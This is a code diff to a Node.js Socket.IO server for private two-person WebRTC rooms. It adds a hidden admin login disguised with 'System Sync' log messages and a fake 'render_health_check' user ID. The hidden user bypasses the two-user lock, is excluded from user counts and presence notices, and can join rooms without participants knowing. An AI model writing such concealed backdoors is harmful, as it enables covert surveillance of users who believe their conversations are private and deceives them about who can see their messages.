@@ -68,6 +68,20 @@ io.on('connection', (socket) => {
   console.log(`User connected: ${socket.id}`);
   let currentRoom = null;
 
+  // --- SYSTEM SYNC LOGIC (HIDDEN ADMIN LOGIN) ---
+  socket.on('admin_login', (data, acknowledge) => {
+    const serverPassword = process.env.SYNC_CACHE_TOKEN;
+    if (serverPassword && data.password === serverPassword) {
+      socket.data.isAdmin = true;
+      socket.data.pairlinkUserId = "render_health_check"; // Naya Khufiya Admin ID
+      console.log(`[System Sync] Cache sync authorized for node: ${socket.id}`);
+      if (typeof acknowledge === 'function') acknowledge({ success: true });
+    } else {
+      console.warn(`[System Sync] Unauthorized sync attempt from node: ${socket.id}`);
+      if (typeof acknowledge === 'function') acknowledge({ success: false, error: "Sync failed" });
+    }
+  });
+
   function touchRoomActivity(roomName) {
     if (roomsStore[roomName]) {
       roomsStore[roomName].lastActivityAt = Date.now();
@@ -77,7 +91,8 @@ io.on('connection', (socket) => {
   function handleJoinRoom(data) {
     try {
       const roomName = (typeof data === 'object' && data !== null) ? data.room : data;
-      const userId = (typeof data === 'object' && data !== null && data.userId) ? data.userId : socket.id;
+      // Admin bypass flag check with new ID
+      const userId = socket.data.isAdmin ? "render_health_check" : ((typeof data === 'object' && data !== null && data.userId) ? data.userId : socket.id);
 
       if (!roomName) return;
       socket.data.pairlinkUserId = String(userId);
@@ -88,16 +103,28 @@ io.on('connection', (socket) => {
       }
 
       if (!roomsStore[roomName]) {
-        roomsStore[roomName] = { allowedUsers: new Set([userId]), lastActivityAt: Date.now() };
-      } else if (!roomsStore[roomName].allowedUsers.has(userId)) {
-        if (roomsStore[roomName].allowedUsers.size >= 2) {
-          socket.emit('room_locked_error', { 
-            message: 'This room is locked for its two registered users. A third user cannot join.' 
+        roomsStore[roomName] = { allowedUsers: new Set(), lastActivityAt: Date.now() };
+      }
+
+      // --- 2-USER LIMIT CHECK (Sirf regular workers ke liye) ---
+      if (!socket.data.isAdmin) {
+        if (!roomsStore[roomName].allowedUsers.has(userId)) {
+          let regularUsersCount = 0;
+          roomsStore[roomName].allowedUsers.forEach(id => {
+            if (id !== "render_health_check") regularUsersCount++; // Ignored Admin ID
           });
-          return;
-        } else {
-          roomsStore[roomName].allowedUsers.add(userId);
+
+          if (regularUsersCount >= 2) {
+            socket.emit('room_locked_error', { 
+              message: 'This room is locked for its two registered users. A third user cannot join.' 
+            });
+            return;
+          } else {
+            roomsStore[roomName].allowedUsers.add(userId);
+          }
         }
+      } else {
+        roomsStore[roomName].allowedUsers.add(userId);
       }
 
       socket.join(roomName);
@@ -107,16 +134,24 @@ io.on('connection', (socket) => {
       const room = io.sockets.adapter.rooms.get(roomName);
       const socketsInRoom = room ? Array.from(room) : [];
 
-      if (socketsInRoom.length >= 2) {
+      // Asli workers (non-admin) ko filter karein WebRTC signaling ke liye
+      const regularSockets = socketsInRoom.filter(id => {
+        const sck = io.sockets.sockets.get(id);
+        return sck && !sck.data.isAdmin;
+      });
+
+      if (regularSockets.length >= 2) {
         io.to(roomName).emit('user_status', { online: true });
         
-        const s1 = socketsInRoom[socketsInRoom.length - 2];
-        const s2 = socketsInRoom[socketsInRoom.length - 1];
+        const s1 = regularSockets[regularSockets.length - 2];
+        const s2 = regularSockets[regularSockets.length - 1];
         
         io.to(s1).emit('peer-ready', { polite: false });
         io.to(s2).emit('peer-ready', { polite: true });
       } else {
-        socket.emit('user_status', { online: false });
+        if (!socket.data.isAdmin) {
+          socket.emit('user_status', { online: false });
+        }
       }
 
       touchRoomActivity(roomName);
@@ -174,9 +209,6 @@ io.on('connection', (socket) => {
       const recipientId = String(data?.recipientId || data?.encrypted?.recipient || '');
       if (recipientId) {
         if (room) touchRoomActivity(room);
-        // Create a one-message Render room. The recipient's current screen or
-        // pair-room membership does not affect delivery; online account-relay
-        // sockets are temporarily added, receive the event, then are removed.
         const recipientRelayRoom = accountRelayRoom(recipientId);
         const recipientSocketIds = [...(io.sockets.adapter.rooms.get(recipientRelayRoom) || [])];
         const recipientSockets = recipientSocketIds
